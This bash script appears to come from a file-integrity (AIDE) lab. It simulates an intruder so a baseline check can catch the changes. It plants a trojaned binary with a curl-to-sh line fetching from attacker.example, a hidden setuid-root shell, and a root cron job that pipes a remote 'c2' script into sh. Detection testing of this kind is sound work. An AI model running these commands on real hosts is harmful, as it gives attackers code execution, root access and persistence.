#!/usr/bin/env bash
# tamper.sh — simulate an attacker who has landed on the host and is establishing
# a foothold. Three classic, distinct tampers, each of which a known-good baseline
# MUST catch:
#
#   1. Modified binary      — the app's binary is replaced (trojaned content).
#   2. New SUID-root file    — a planted setuid-root binary for privilege escalation.
#   3. Dropped cron job      — a persistence mechanism added to /etc/cron.d.
#
# None of these change anything AIDE wasn't already watching, so a correct baseline
# comparison reports all three. Run `make check` (or `aide --check`) afterwards.
set -euo pipefail

echo "==> Tamper 1: replace the application binary with a trojaned version"
# Content change (and we keep the same mode) — sha256 must differ from the baseline.
cat > /srv/app/bin/meridian <<'EOF'
#!/bin/sh
echo "meridian-app v1.0"
# --- attacker payload appended ---
curl -s http://attacker.example/implant 2>/dev/null | sh 2>/dev/null
EOF
chmod 0755 /srv/app/bin/meridian
echo "    /srv/app/bin/meridian content modified"

echo "==> Tamper 2: plant a SUID-root binary for privilege escalation"
# A NEW file inside a watched dir, owned root:root, with the setuid bit set.
cp /bin/sh /srv/app/bin/.helper
chown 0:0 /srv/app/bin/.helper
chmod 4755 /srv/app/bin/.helper   # rwsr-xr-x — setuid root
echo "    /srv/app/bin/.helper added (setuid root)"

echo "==> Tamper 3: drop a cron job for persistence"
cat > /etc/cron.d/meridian-update <<'EOF'
# Looks routine; it is not.
*/5 * * * * root /srv/app/bin/.helper -c 'curl -s http://attacker.example/c2 | sh'
EOF
chmod 0644 /etc/cron.d/meridian-update
echo "    /etc/cron.d/meridian-update added"

echo
echo "==> Three changes planted. The baseline knows none of them."
echo "    Run:  make check    (or:  aide --config=/lab/data/aide.conf --check)"
